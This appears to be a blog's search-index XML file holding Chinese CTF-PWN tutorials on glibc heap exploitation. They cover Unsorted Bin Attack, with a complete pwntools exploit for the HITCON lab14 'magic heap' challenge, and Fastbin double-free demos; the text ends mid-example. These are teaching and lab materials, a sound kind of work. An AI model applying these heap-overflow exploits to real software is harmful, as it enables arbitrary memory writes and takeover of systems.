<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Unsorted Bin Attack</title>
      <link href="/2020/10/20/unsorted-bin-attack/"/>
      <url>/2020/10/20/unsorted-bin-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。</p><p>Unsorted Bin Attack 被利用的<strong>前提是控制 Unsorted Bin Chunk 的 bk 指针。</strong><br>Unsorted Bin Attack 可以达到的效果是<strong>实现修改任意地址值为一个较大的数值。</strong></p><h2 id="Unsorted-Bin-回顾"><a href="#Unsorted-Bin-回顾" class="headerlink" title="Unsorted Bin 回顾"></a>Unsorted Bin 回顾</h2><p>在介绍 Unsorted Bin 攻击前，可以先回顾一下 Unsorted Bin 的<strong>基本来源以及基本使用情况</strong>。</p><h3 id="基本来源"><a href="#基本来源" class="headerlink" title="基本来源"></a>基本来源</h3><p>当一个<strong>较大的 chunk 被分割成两半后</strong>，如果<strong>剩下的部分大于 MINSIZE</strong>，就会被放到 unsorted bin 中。<br><strong>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时</strong>，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。<br>当进行 <strong>malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中</strong>，如果不是和 top chunk 近邻的话。</p><h3 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h3><ul><li>Unsorted Bin 在使用的过程中，<strong>采用的遍历顺序是 FIFO</strong>，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。</li><li><strong>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中</strong><br>详情见malloc源码分析</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 glibc/malloc/malloc.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置。</p><pre class=" language-c"><code class="language-c">          <span class="token comment" spellcheck="true">/* remove from unsorted list */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): corrupted unsorted chunks 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//bck倒数第二个chunk</span>          bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>换而言之，如果我们<strong>控制了 bk 的值</strong>，我们就能将 unsorted_chunks (av) 写到任意地址。<br>一般将bk修改为<strong>targetaddr-0x10</strong>这样在将我们所控制的unsorted_chunk malloc掉之后就会发生如下情况：<br>示意图：<br><img src="https://s1.ax1x.com/2020/10/20/BpIbNj.png" alt=""><br>bk所指向的fake_chunk将会被添加到unsortedbin中，将fake_chunk-&gt;fd = &amp;unsortedbin,注意fake_chunk-&gt;bk是不会被赋值的。</p><ul><li>初始状态时<ul><li>unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。    </li></ul></li><li>执行 free(p)<ul><li>由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。    </li><li>修改 p[1]    </li></ul></li><li>经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</li><li>申请 400 大小的 chunk</li><li>此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去 unsorted bin 中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。</li></ul><h3 id="对应源码"><a href="#对应源码" class="headerlink" title="对应源码"></a>对应源码</h3><p>第一个判断</p><pre class=" language-c"><code class="language-c">              <span class="token comment" spellcheck="true">/*1处于smallbinsfanwei 2存在last_remainder   3 size大于nb + MINSIZE，保证可以进行切割   */</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> bck <span class="token operator">==</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                victim <span class="token operator">==</span> av<span class="token operator">-></span>last_remainder <span class="token operator">&amp;&amp;</span>                <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                    <span class="token punctuation">}</span></code></pre><p>因为我们修改了bk指针所以肯定不会生效</p><pre class=" language-c"><code class="language-c">             <span class="token comment" spellcheck="true">/*如果上面的那几个苛刻条件没满足，那就直接把最后chunk的链接解除*/</span>             <span class="token comment" spellcheck="true">/* remove from unsorted list 最后的chunk解除链接 */</span>            <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>            bck<span class="token operator">-></span>fd                 <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果从 unsorted bin 中取出来的 chunk 大小正好合适，就直接使用。</span><span class="token comment" spellcheck="true">/* Take now instead of binning if exact fit */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> nb<span class="token punctuation">)</span>            <span class="token punctuation">{</span>              <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//设置物理相邻的下一个chunk的inuse位为1</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>                victim<span class="token operator">-></span>size <span class="token operator">|</span><span class="token operator">=</span> NON_MAIN_ARENA<span class="token punctuation">;</span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//直接返回</span>            <span class="token punctuation">}</span></code></pre><p>我们在修改bk后过程为：</p><ul><li>victim = unsorted_chunks(av)-&gt;bk=p</li><li>bck = victim-&gt;bk=p-&gt;bk = target addr-16</li><li>unsorted_chunks(av)-&gt;bk = bck=target addr-16</li><li>bck-&gt;fd = *(target addr -16+16) = unsorted_chunks(av);  //最终效果<br>可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，<strong>victim 的 fd 并没有发挥作用</strong>，所以即使我们修改了其为一个不合法的值也没有关系。然而，需要注意的是，<strong>unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</strong></li></ul><p>unsorted bin attack 确实<strong>可以修改任意地址的值</strong>，但是所修改成的值却<strong>不受我们控制，唯一可以知道的是，这个值比较大</strong>。而且，需要注意的是，<br>这看起来似乎并没有什么用处，但是其实还是有点卵用的，比如说</p><ul><li>我们通过<strong>修改循环的次数</strong>来使得程序可以执行多次循环。</li><li>我们可以<strong>修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin</strong>，这样我们就可以去执行一些** fast bin attack **了。</li></ul><h2 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><pre class=" language-c"><code class="language-c">matrix@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>BUU$ checksec magicheap<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/PWN/BUU/magicheap'</span>    Arch<span class="token punctuation">:</span>     amd64<span class="token number">-64</span><span class="token operator">-</span>little    RELRO<span class="token punctuation">:</span>    Partial RELRO    Stack<span class="token punctuation">:</span>    Canary found    NX<span class="token punctuation">:</span>       NX enabled    PIE<span class="token punctuation">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span></code></pre><p>PIE关闭</p><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><pre class=" language-c"><code class="language-c">      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">4869</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>bss_data <span class="token operator">&lt;=</span> <span class="token number">4869</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"So sad !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congrt !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">get_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><p>这里给出了明显的后门，只需bss_data的数据大于4869即可</p><p>在edit功能中存在堆溢出漏洞</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">edit_heap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-10h]</span>  size_t size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v1 <span class="token operator">></span> <span class="token number">9</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>bss_ptr_chunk<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No such heap !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size of Heap : "</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// new_size</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content of heap : "</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read_input</span><span class="token punctuation">(</span>bss_ptr_chunk<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">]</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>整个程序的功能是想实现一个堆分配器：</p><ul><li>create chunk</li><li>edit chunk</li><li>delete chunk</li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>利用堆溢出漏洞将一个smallbins chunk的bk修改为target_Addr - 0x10即可</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size of Heap : '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content of heap:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>cont<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delet</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size of Heap : '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content of heap : '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>cont<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = process('./magicheap')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26049</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'AAAAAAAA'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">'BBBBBBBBB'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'CCCCCCCC'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span>delet<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delet<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>bss_data <span class="token operator">=</span> <span class="token number">0x06020A0</span> payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#prev</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#size</span>payload <span class="token operator">+=</span> <span class="token string">'fd'</span><span class="token operator">*</span><span class="token number">4</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_data<span class="token number">-0x10</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">'create'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastbin Attack</title>
      <link href="/2020/10/20/fastbin-attack/"/>
      <url>/2020/10/20/fastbin-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有<strong>基于 fastbin 机制的漏洞利用方法</strong>。这类利用的前提是：</p><ul><li>存在堆溢出、use-after-free <strong>等能控制 chunk 内容</strong>的漏洞</li><li>漏洞发生于 fastbin 类型的 chunk 中</li></ul><p>如果细分的话，可以做如下的分类：</p><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>fastbin attack 存在的原因在于 fastbin 是使用<strong>单链表来维护释放的堆块</strong>的，并且由 fastbin 管理的 chunk 即使被释放，其 <strong>next_chunk 的 prev_inuse 位也不会被清空</strong>。</p><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>Fastbin Double Free 是指 <strong>fastbin 的 chunk 可以被多次释放</strong>，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配<strong>可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块</strong>，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p><ul><li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了第一个和第二个chunk是否是同一个chunk<pre class=" language-c"><code class="language-c">  <span class="token keyword">do</span>    <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* Check that the top of the bin is not the record we are going to add     (i.e., double free).  */</span>  <span class="token comment" spellcheck="true">/*原来表头fd所放的就是old，这里是防止连续两次free同一个chunk*/</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>old <span class="token operator">==</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      errstr <span class="token operator">=</span> <span class="token string">"double free or corruption (fasttop)"</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre></li></ul><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span><span class="token operator">*</span>chunk2<span class="token punctuation">,</span><span class="token operator">*</span>chunk3<span class="token punctuation">;</span>    chunk1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk2<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>按顺序是释放三次后：</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x602000</span><span class="token number">0x602000</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000021</span> <span class="token number">0x602010</span><span class="token operator">:</span>    <span class="token number">0x0000000000602020</span>    <span class="token number">0x0000000000000000</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>fd指向chunk2<span class="token number">0x602020</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000021</span><span class="token number">0x602030</span><span class="token operator">:</span>    <span class="token number">0x0000000000602000</span>    <span class="token number">0x0000000000000000</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>fd指向chunk1<span class="token number">0x602040</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020fc1</span>pwndbg<span class="token operator">></span> <span class="token function">heapinfo</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x602000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x602020</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x602000</span> <span class="token punctuation">(</span>overlap chunk with <span class="token function">0x602000</span><span class="token punctuation">(</span>freed<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0x0</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0x0</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x0</span></code></pre><p>那么再次malloc获得chunk_0x602000就能改写 chunk_0x602000的fd内容使得：<br><img src="https://s1.ax1x.com/2020/10/20/BSNmNR.png" alt=""><br>然后我们malloc掉chunk2，chunk1，再次malloc就能获取其他内存区的读写权，也就是任意地址读写。</p><h3 id="演示2"><a href="#演示2" class="headerlink" title="演示2"></a>演示2</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _chunk<span class="token punctuation">{</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pre_size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> fd<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> bk<span class="token punctuation">;</span><span class="token punctuation">}</span> CHUNK<span class="token punctuation">,</span><span class="token operator">*</span>PCHUNK<span class="token punctuation">;</span>CHUNK bss_chunk<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span><span class="token operator">*</span>chunk2<span class="token punctuation">,</span><span class="token operator">*</span>chunk3<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">,</span><span class="token operator">*</span>chunk_b<span class="token punctuation">;</span>    bss_chunk<span class="token punctuation">.</span>size<span class="token operator">=</span><span class="token number">0x21</span><span class="token punctuation">;</span>    chunk1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk2<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk_a<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    